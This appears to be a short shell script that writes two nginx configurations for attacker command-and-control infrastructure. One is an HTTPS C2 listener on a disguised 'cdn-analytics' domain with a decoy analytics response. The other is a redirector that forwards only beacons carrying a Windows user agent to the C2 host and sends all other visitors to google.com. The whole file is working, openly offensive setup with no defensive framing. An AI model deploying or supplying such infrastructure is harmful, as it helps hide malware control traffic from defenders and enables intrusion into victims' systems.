steps.cmd:
cat > /etc/nginx/conf.d/c2-https.conf << 'CONF'
server {
    listen 443 ssl http2;
    server_name cdn-analytics[.]com;
    ssl_certificate /etc/letsencrypt/live/cdn-analytics[.]com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-analytics[.]com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_session_tickets off;
    add_header Strict-Transport-Security "max-age=31536000" always;
    location /api/telemetry { proxy_pass http://127.0.0.1:50050; }
    location / { return 200 '{"service":"analytics","version":"2.1"}'; add_header Content-Type application/json; }
}
CONF
nginx -t && systemctl reload nginx && echo '[+] HTTPS C2 listener active'

cat > /etc/nginx/conf.d/redirector.conf << 'CONF'
server {
    listen 443 ssl http2;
    server_name updates.cdn-analytics[.]com;
    ssl_certificate /etc/letsencrypt/live/cdn-analytics[.]com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-analytics[.]com/privkey.pem;

    # Only forward valid C2 beacons
    location /api/telemetry {
        if ($http_user_agent !~* 'Mozilla/5.0.*Windows NT 10') { return 404; }
        proxy_pass https://c2.cdn-analytics[.]com;
        proxy_ssl_verify off;
    }
    # Block all other requests
    location / { return 301 https://www.google.com; }
}
CONF
nginx -t && systemctl reload nginx
